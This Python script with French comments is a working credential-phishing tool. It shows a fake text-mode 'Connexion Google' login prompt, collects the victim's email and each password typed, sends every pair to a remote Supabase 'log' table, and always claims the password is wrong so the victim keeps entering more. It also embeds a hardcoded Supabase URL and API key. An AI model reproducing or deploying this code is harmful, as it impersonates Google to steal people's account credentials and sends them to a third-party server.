from supabase import create_client, Client

# Remplacez par vos informations Supabase
SUPABASE_URL = "https://isglyvyafrpnvoxjcgjy.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlzZ2x5dnlhZnJwbnZveGpjZ2p5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDQ5MDQ0NTMsImV4cCI6MjA2MDQ4MDQ1M30.Fw6qoLSQGty7PsYGxh8krxt-JCSIN9Nd1r4kMRLfU9I"

def connect_to_supabase() -> Client:
    """Connecte au client Supabase."""
    return create_client(SUPABASE_URL, SUPABASE_KEY)

def insert_log_entry(supabase: Client, email: str, password: str):
    """Insère un email et un mot de passe dans la table 'log'."""
    data = {"email": email, "password": password}
    response = supabase.table("log").insert(data).execute()
    if response.data:  # Vérifie si des données ont été insérées avec succès
        print("Données insérées avec succès.")
    else:
        print("Erreur lors de l'insertion :", response)

def main():
    # Connexion à Supabase
    supabase = connect_to_supabase()

    # Affichage d'une interface textuelle ressemblant à Google
    print("=" * 50)
    print("Connexion Google".center(50))
    print("=" * 50)
    print("Veuillez vous connecter avec votre compte Google")
    print()

    # Demande des informations utilisateur
    email = input("Adresse e-mail : ")

    # Boucle pour demander le mot de passe en continu
    while True:
        password = input("Mot de passe : ")
        insert_log_entry(supabase, email, password)
        print("Mot de passe incorrect, veuillez réessayer.")
        print()

if __name__ == "__main__":
    main()